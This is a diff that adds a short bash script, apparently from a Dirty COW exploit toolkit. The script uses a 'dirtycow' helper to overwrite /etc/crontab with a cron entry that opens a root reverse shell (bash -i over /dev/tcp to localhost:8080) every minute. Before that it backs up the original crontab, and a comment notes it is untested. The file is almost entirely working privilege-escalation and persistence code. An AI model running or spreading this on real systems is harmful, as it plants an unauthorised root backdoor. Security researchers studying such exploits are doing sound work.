@@ -1,0 +1,22 @@
+#!/bin/bash
+#
+# Edit /etc/crontab to add a reverse root shell at localhost:8080 if it doesn't
+# exist (ran every minute).
+#
+# A backup of /etc/crontab is stored in $HOME before modifying the file.
+#
+# TODO: Test this script to make sure it works properly.
+
+. "$(dirname "$0")/common.sh"
+
+if [ ! -r /etc/crontab ]; then
+	die "/etc/crontab does not exist or is not readable."
+fi
+
+backup="$HOME/crontab"
+cp /etc/crontab "$backup"
+echoerr "Backed up /etc/crontab to $backup"
+
+dirtycow -a /etc/crontab <<EOF
+*/1 *	* * *	root	[ ! -e /tmp/dirtycow-rshell ] && touch /tmp/dirtycow-rshell && bash -i >&/dev/tcp/localhost/8080 0>&1
+EOF
